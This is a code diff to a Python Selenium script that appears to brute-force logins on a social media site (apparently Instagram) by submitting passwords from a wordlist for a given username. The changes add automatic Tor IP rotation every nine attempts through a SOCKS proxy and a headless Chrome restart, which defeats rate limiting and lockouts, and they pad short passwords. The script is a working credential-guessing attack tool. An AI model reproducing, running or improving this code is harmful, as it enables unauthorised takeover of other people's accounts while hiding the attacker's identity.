@@ -67,7 +67,7 @@ def file_length(fname):
 #Function for getting a new IP, through TOR
 def renew_tor_ip():
     with Controller.from_port(port = 9051) as controller:
-        controller.authenticate(password="accessdenied")
+        controller.authenticate()
         controller.signal(Signal.NEWNYM)
 
 ###########  Setting up the driver  ###################
@@ -97,6 +97,21 @@ os.system(ops)
 # Main Loop
 while True:
     n += 1
+    if n % 9 == 0:
+        renew_tor_ip()
+        driver.quit()
+        #Assigning TOR proxy
+        PROXY =  "socks5://127.0.0.1:9050"
+        #Adding the proxy to chrome
+        options = webdriver.ChromeOptions()
+        options.add_argument('--proxy-server=%s' % PROXY)
+        options.add_argument('headless')
+        options.add_argument('--log-level=3')
+        #Setting up the chromedriver
+        driver = webdriver.Chrome(options=options, executable_path=r'C:/webdrivers/chromedriver.exe') # <<<< EDIT this according to your directory
+        print("\n")
+        print("This IP was used 9 times")
+        print("Getting new IP...")
     # Separating words in the wordlist
     f = open(str(passlist),"r")
     passw = f.readlines()[a:b]
@@ -133,8 +148,13 @@ while True:
 
     #Entering username and password
     username.send_keys(str(uname))
-    password.send_keys(str(p))
+    if len(p) < 6:
+        p + "11111"
+        password.send_keys(str(p + "11111"))
+    else:
+        password.send_keys(str(p))
     time.sleep(1)
+
     #Submitting, the password and the username
     submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
     submit.click()
